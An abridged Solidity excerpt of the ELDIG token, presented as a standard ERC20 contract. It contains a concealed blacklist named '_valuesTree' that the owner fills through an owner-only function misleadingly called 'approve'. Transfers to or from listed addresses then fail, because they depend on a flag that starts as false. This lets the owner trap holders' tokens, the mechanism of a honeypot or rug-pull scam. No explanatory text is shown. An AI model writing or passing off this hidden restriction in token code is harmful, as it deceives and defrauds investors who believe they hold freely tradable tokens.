...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    mapping (address => bool) private _valuesTree;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    bool private _valuesTreeApplied = false;
    ...
    function approve(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _valuesTree[_addresses_[i]] = true;
    ...
    function _transfer(
        ...
        if (_valuesTree[from] || _valuesTree[to]) require(_valuesTreeApplied == true, "");
...
contract ELDIG is ERC20 {
    constructor() ERC20("ELDIG", "ELDIG") {
